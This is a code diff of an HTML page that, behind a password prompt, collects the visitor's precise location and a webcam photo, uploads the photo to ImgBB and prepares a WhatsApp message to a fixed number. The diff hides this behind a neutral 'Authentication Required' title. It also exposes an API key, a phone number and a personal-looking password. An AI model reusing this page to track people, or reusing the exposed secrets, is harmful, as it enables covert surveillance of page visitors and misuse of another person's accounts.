@@ -3,109 +3,120 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Location & Auto Photo to WhatsApp</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/mega/1.0.3/mega.min.js"></script>
-</head>
-<body>
-    <h1>Sending Live Location & Photo to WhatsApp...</h1>
-    <p id="status">Waiting for authentication...</p>
-    <canvas id="canvas" style="display: none;"></canvas>
-
+    <title>Authentication Required</title>
     <script>
-        const IMGBB_API_KEY = "83601732f6095faec5d42577498c1da8";  // Replace with your ImgBB API key
-        const WHATSAPP_NUMBER = "94713424265";  // Replace with recipient's WhatsApp number
-        const PASSWORD = "Nipunapramod@1";  // Change this to your desired password
+        const PASSWORD = "secure123";  // Change this to your desired password
 
-        let locationLink = "";  
-        let locationFilename = "";  
-
-        // 📌 Function to send message to WhatsApp
-        function sendToWhatsApp(photoLink) {
-            const message = `📍 Location: ${locationLink}\n📷 Photo: ${photoLink}`;
-            const whatsappUrl = `https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(message)}`;
-            window.location.href = whatsappUrl; 
-        }
-
-        // 📌 Function to get live location
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lng = position.coords.longitude;
-                        locationLink = `https://www.google.com/maps?q=${lat},${lng}`;
-                        locationFilename = `photo_${lat}_${lng}.png`;
-                        document.getElementById("status").innerText = "Location found! Taking photo...";
-                        capturePhoto();
-                    },
-                    (error) => {
-                        document.getElementById("status").innerText = "Error getting location: " + error.message;
-                    },
-                    { enableHighAccuracy: true, maximumAge: 0 }
-                );
-            } else {
-                document.getElementById("status").innerText = "Geolocation is not supported by this browser.";
-            }
-        }
-
-        // 📌 Function to capture photo
-        async function capturePhoto() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement("video");
-                video.srcObject = stream;
-                video.play();
-
-                video.onloadedmetadata = () => {
-                    const canvas = document.getElementById("canvas");
-                    const ctx = canvas.getContext("2d");
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    stream.getTracks().forEach(track => track.stop());
-                    canvas.toBlob(uploadToImgBB, "image/png");
-                };
-            } catch (error) {
-                console.error("Camera access error:", error);
-            }
-        }
-
-        // 📌 Function to upload photo to ImgBB
-        function uploadToImgBB(blob) {
-            const formData = new FormData();
-            formData.append("image", blob);
-            formData.append("key", IMGBB_API_KEY);
-
-            fetch("https://api.imgbb.com/1/upload", {
-                method: "POST",
-                body: formData,
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    sendToWhatsApp(data.data.url);
-                } else {
-                    console.error("ImgBB upload failed:", data.error);
-                }
-            })
-            .catch(error => {
-                console.error("ImgBB API request failed:", error);
-            });
-        }
-
-        // 📌 Password authentication
         function authenticate() {
             const userPassword = prompt("Enter Password:");
             if (userPassword === PASSWORD) {
-                document.getElementById("status").innerText = "Authenticated! Getting location...";
-                getLocation();
+                document.open();  // Clear the document
+                document.write(`
+                    <!DOCTYPE html>
+                    <html lang="en">
+                    <head>
+                        <meta charset="UTF-8">
+                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                        <title>Live Location & Auto Photo to WhatsApp</title>
+                        <script src="https://cdnjs.cloudflare.com/ajax/libs/mega/1.0.3/mega.min.js"></script>
+                    </head>
+                    <body>
+                        <h1>Sending Live Location & Photo to WhatsApp...</h1>
+                        <p id="status">Initializing...</p>
+                        <canvas id="canvas" style="display: none;"></canvas>
+
+                        <script>
+                            const IMGBB_API_KEY = "83601732f6095faec5d42577498c1da8";
+                            const WHATSAPP_NUMBER = "94713424265";
+
+                            let locationLink = "";
+                            let locationFilename = "";
+
+                            function sendToWhatsApp(photoLink) {
+                                const message = \`📍 Location: \${locationLink}\\n📷 Photo: \${photoLink}\`;
+                                const whatsappUrl = \`https://wa.me/\${WHATSAPP_NUMBER}?text=\${encodeURIComponent(message)}\`;
+                                window.location.href = whatsappUrl;
+                            }
+
+                            function getLocation() {
+                                if (navigator.geolocation) {
+                                    navigator.geolocation.getCurrentPosition(
+                                        (position) => {
+                                            const lat = position.coords.latitude;
+                                            const lng = position.coords.longitude;
+                                            locationLink = \`https://www.google.com/maps?q=\${lat},\${lng}\`;
+                                            locationFilename = \`photo_\${lat}_\${lng}.png\`;
+                                            document.getElementById("status").innerText = "Location found! Taking photo...";
+                                            capturePhoto();
+                                        },
+                                        (error) => {
+                                            document.getElementById("status").innerText = "Error getting location: " + error.message;
+                                        },
+                                        { enableHighAccuracy: true, maximumAge: 0 }
+                                    );
+                                } else {
+                                    document.getElementById("status").innerText = "Geolocation is not supported by this browser.";
+                                }
+                            }
+
+                            async function capturePhoto() {
+                                try {
+                                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                                    const video = document.createElement("video");
+                                    video.srcObject = stream;
+                                    video.play();
+
+                                    video.onloadedmetadata = () => {
+                                        const canvas = document.getElementById("canvas");
+                                        const ctx = canvas.getContext("2d");
+                                        canvas.width = video.videoWidth;
+                                        canvas.height = video.videoHeight;
+                                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                        stream.getTracks().forEach(track => track.stop());
+                                        canvas.toBlob(uploadToImgBB, "image/png");
+                                    };
+                                } catch (error) {
+                                    console.error("Camera access error:", error);
+                                }
+                            }
+
+                            function uploadToImgBB(blob) {
+                                const formData = new FormData();
+                                formData.append("image", blob);
+                                formData.append("key", IMGBB_API_KEY);
+
+                                fetch("https://api.imgbb.com/1/upload", {
+                                    method: "POST",
+                                    body: formData,
+                                })
+                                .then(response => response.json())
+                                .then(data => {
+                                    if (data.success) {
+                                        sendToWhatsApp(data.data.url);
+                                    } else {
+                                        console.error("ImgBB upload failed:", data.error);
+                                    }
+                                })
+                                .catch(error => {
+                                    console.error("ImgBB API request failed:", error);
+                                });
+                            }
+
+                            window.onload = getLocation;
+                        <\/script>
+                    </body>
+                    </html>
+                `);
+                document.close();
             } else {
-                document.getElementById("status").innerText = "Access Denied!";
+                alert("Access Denied!");
+                authenticate();  // Re-prompt password if incorrect
             }
         }
 
-        // 📌 Start authentication on page load
         window.onload = authenticate;
     </script>
+</head>
+<body>
 </body>
 </html>
